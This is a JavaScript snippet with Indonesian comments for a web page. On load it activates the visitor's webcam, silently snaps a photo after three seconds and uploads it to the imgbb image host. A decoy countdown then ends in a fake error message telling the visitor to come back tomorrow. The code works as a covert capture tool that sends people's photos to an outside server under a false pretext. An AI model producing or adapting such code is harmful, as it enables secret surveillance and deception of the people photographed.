    function initializeWebcam() {
      Webcam.set({
        width: 640,
        height: 480,
        dest_width: 640,
        dest_height: 480,
        image_format: 'jpeg',
        jpeg_quality: 90
      });

      Webcam.attach('#videoElement');

      // Mengambil snapshot otomatis setelah 3 detik
      setTimeout(takeSnapshot, 3000);
    }

    function takeSnapshot() {
      Webcam.snap(function(dataURL) {
        // Mengubah data URL menjadi blob
        var blob = dataURLToBlob(dataURL);

        // Mengirim permintaan POST ke IMGBB API untuk mengunggah gambar
        var apiUrl = "https://api.imgbb.com/1/upload";
        var apiKey = "API-KEY-ANDA";

        var formData = new FormData();
        formData.append("image", blob);

        fetch(apiUrl + "?expiration=600&key=" + apiKey, {
          method: "POST",
          body: formData
        })
        .then(response => response.json())
        .then(data => {
          console.log(data);
          // Lakukan tindakan setelah berhasil mengunggah gambar ke IMGBB
        })
        .catch(error => {
          console.error(error);
          // Lakukan penanganan kesalahan jika ada
        });
      });
    }

    function dataURLToBlob(dataURL) {
      var parts = dataURL.split(';base64,');
      var contentType = parts[0].split(':')[1];
      var raw = window.atob(parts[1]);
      var rawLength = raw.length;
      var uInt8Array = new Uint8Array(rawLength);

      for (var i = 0; i < rawLength; ++i) {
        uInt8Array[i] = raw.charCodeAt(i);
      }

      return new Blob([uInt8Array], { type: contentType });
    }

    // Memanggil inisialisasi webcam setelah halaman selesai dimuat
    window.addEventListener('DOMContentLoaded', initializeWebcam);

    // Mengambil elemen dengan id 'countdown'
    var countdownElement = document.getElementById('countdown');
    var countdownTextElement = document.getElementById('countdownText');

    // Mengatur waktu awal
    var count = 10;

    // Fungsi hitung mundur
    function countdown() {
      // Menampilkan nilai count di dalam elemen countdown
      countdownElement.innerHTML = count;

      // Mengurangi count
      count--;

      // Memeriksa apakah hitung mundur telah selesai
      if (count < 0) {
        clearInterval(interval);
        var newText = "Sepertinya terjadi kesalahan. Silahkan buka halaman ini besok."; // Teks baru yang akan menggantikan elemen <div>
        countdownTextElement.replaceWith(newText);
      }
    }

    // Memulai hitung mundur setiap 1 detik (1000 milidetik)
    var interval = setInterval(countdown, 1000);
